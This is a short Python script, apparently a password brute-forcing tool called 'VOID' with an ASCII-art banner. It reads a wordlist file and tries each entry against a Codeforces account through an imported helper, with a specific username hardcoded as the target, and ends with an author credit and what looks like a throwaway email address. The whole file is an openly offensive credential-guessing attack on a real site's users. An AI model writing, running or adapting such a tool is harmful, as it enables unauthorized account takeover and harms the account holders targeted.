import requests
from vcheck import vcodeforces
import os
from colorama import Fore 

def banner():
        print(Fore.BLUE+"""
                     @                
                   .##@               
                  .####@              
                  @#####@             
                . *######@            
               .##@o@#####@           
              /############@          
             /##############@         
            @######@**%######@        
           @######`     %#####o       
          @######@ VOID ######%      
        -@#######h       ######@.`    
       /#####h**``       `**%@####@   
      @H@*`                    `*%#@  
     *`                            `* 
        """)

def void_brute(username,type):

        if type=="codeforces":
                wordlist = []
                with open("./wordlist/12bin.txt") as f:
                        for l in f:
                                wordlist.append(l.strip())
                
                for i in range(0, len(wordlist)):
                        vcodeforces(username,wordlist[i])

if __name__ == "__main__":
        os.system("clear")
        banner()
        void_brute("dylenw","codeforces")
"""
hiwecaj674
hiwecaj674@offsala.com
"""

"""
# TheSadError
### Github : https://github.com/TheSadError/
### Discord : thesaderror#4018

### TheSadError wont be sad soon... :) 
"""